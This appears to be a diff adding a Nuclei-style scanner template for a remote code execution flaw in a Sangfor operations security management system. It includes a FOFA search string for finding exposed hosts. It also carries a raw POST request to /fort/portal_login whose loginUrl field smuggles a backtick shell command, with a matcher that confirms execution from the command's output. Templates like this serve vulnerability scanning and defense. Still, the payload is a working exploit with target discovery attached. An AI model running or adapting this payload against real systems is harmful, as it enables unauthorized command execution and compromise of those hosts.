@@ -1,0 +1,22 @@
+id: sxf-OSM-portal_login-rce
+
+info:
+  name: sxf-OSM-portal_login-rce
+  author: PokerSec
+  severity: critical
+  metadata:
+    fofa-search: app="SANGFOR-运维安全管理系统"
+
+http:
+  - raw:
+      - |
+        POST /fort/portal_login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        "{\"userName\":\"Bob\", \"loginUrl\":\"`id`\", \"role\": \"\", \"password\": \"12345678\"}" #
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"webuser") && contains_all(body,"uid=1005")
